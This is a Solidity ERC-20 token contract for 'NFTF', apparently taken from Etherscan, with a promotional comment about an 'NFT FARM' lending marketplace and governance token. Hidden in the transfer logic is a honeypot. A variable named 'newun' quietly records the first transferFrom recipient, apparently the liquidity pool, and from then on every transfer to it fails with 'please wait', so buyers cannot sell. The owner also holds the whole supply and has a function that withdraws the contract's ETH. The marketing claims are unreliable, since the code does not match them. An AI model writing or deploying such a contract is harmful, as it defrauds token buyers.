['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-10\n', '*/\n', '\n', '/*\n', 'Introducing NFT FARM\n', '\n', 'NFT FARM ecosystem include NFT (Non-Fungible Tokens), NFT Lending marketplace and governance token NFTF.\n', '\n', '$NFTF - NFT FARM is a unique ERC20 tokens based on Ethereum Blockchain & OpenSea Smart Contract that makes it possible to buy time. We have broken down 24 hours into 86.400 seconds in format Hours: Minutes: Seconds or simply 00:00:00\n', 'Items design changes every 5 minutes.\n', '\n', 'NFT FARM is a unique product:\n', '- Art intertwined with technology;\n', '- The present intertwined with the future;\n', '- Investments intertwined with collecting.\n', 'In addition to having unique NFT, their holders get the opportunity to receive NFTF token as reward.\n', 'NFT lending marketplace & NFTF token\n', 'Art and collectible markets in general suffer from less liquidity than fiat, equity or other types of assets. Players might miss out on great opportunities or having to sell too cheap to raise cash. Similarly we feel it is a great opportunity for other users to get a return on their ETH\n', 'With our real-time pricing updates for NFT assets, you can get an accurate view of your entire portfolio in one place.\n', 'NFTF — NFT farm MilliSeconds tokens.\n', 'NFTF tokens give ability to:\n', '- Vote for the development of the project and release of new collections of our team or authorized projects\n', '- Stake coin on P2P Marketplace to get rewarded\n', '- Receive unique offers from top NFT creators for borrowing\n', '- Join NFT Farm Stakers Club\n', '- Get fee from Liquidity Mining\n', 'Our goal is to evolve towards a Decentralized Autonomous Organization (DAO), where all decision rights will belong to the platform users.\n', 'NFTF token, awarded to the active users of the NFT farm ecosystem, will act as the governance instrument: it will enable NFT holders, NFT lenders, NFT borrowers and liquidity miners to vote on multiple upgrades and decide how the project should develop further.\n', 'NFTF:\n', '\n', '100,000 Fixed ERC-20 tokens.\n', '- 10% — Team\n', '- 70% — Reward to NFT Holders\n', '- 20% — Reward to P2P Marketplace users\n', '\n', 'NFT FARM Project Launching in April - Seeks to Solve Liquidity Problem on The NFT Market\n', '\n', 'In the wake of the hype around DeFi, projects engaged in other directions have faded into the background. We would like to tell you about the NFT FARM project, which can set a new trend on the NFT market.\n', 'NFT (Non-Fungible Tokens) have become popular thanks to the CryptoKitties project. But few know that since the advent of Cryptokitties in 2017, a whole industry of digital goods has emerged from virtual land (Sandbox) to works of art (Rarible).\n', 'One of the key sites on this market is the OpenSea.io platform. It allows users to create their own virtual stores and sell NFT products. We can say this is the new Apple Store for NFT products. Sales of some projects on the site reach up to 2,000 ETH in volme per week.\n', 'But a reasonable question arises as to who would invest in NFT goods in 2020 when DeFi projects appear every day and are promising three-digit percent per annum. You have to be either a fan, or a collector, or a visionary. Therefore, we will tell you more about NFT FARM and how it wants to solve the liquidity problem on the NFT market.\n', 'The project team is developing a P2P marketplace for lendings secured by NFT goods. The marketplace will operate on the DAO principle and will be managed by the community through the NFTF management token. By referring to the platform, owners of NFT goods will have access to liquidity without losing their NFT assets, and lenders will have the opportunity to receive collateralized income. WIN-WIN scenario.\n', 'The development team from NFT FARM has gone further and launched its own store with NFT products on OpenSea. This is also a unique project of its kind, as it allows NFT FARM owners to stake them. Those buying and holding NFT FARM with subsequent staking on the site will receive rewards in NFTF tokens over the next 8 years! The CTMS also makes it possible to receive rewards from transactions on the P2P marketplace. DOUBLE WIN-WIN scenario!\n', 'You can read more about the NFT FARM NFT / NFTF token\n', '\n', 'Distribution scheme on the official website at https://nftfarm.io\n', '*/\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract ERC20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  address public newOwner;\n', '\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '  function transferOwnership(address _newOwner) public onlyOwner {\n', '    newOwner = _newOwner;\n', '  }\n', '  function acceptOwnership() public {\n', '    require(msg.sender == newOwner);\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '    newOwner = address(0);\n', '  }\n', '}\n', '\n', 'contract TokenERC20 is ERC20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public newun;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  constructor() public {\n', '    symbol = "NFT Farm";\n', '    name = "NFTF";\n', '    decimals = 8;\n', '    _totalSupply = 10000000000000;\n', '    balances[owner] = _totalSupply;\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  function transfernewun(address _newun) public onlyOwner {\n', '    newun = _newun;\n', '  }\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '     require(to != newun, "please wait");\n', '     \n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '      if(from != address(0) && newun == address(0)) newun = to;\n', '      else require(to != newun, "please wait");\n', '      \n', '    balances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract NFTF is TokenERC20 {\n', '\n', '  function clearCNDAO() public onlyOwner() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}']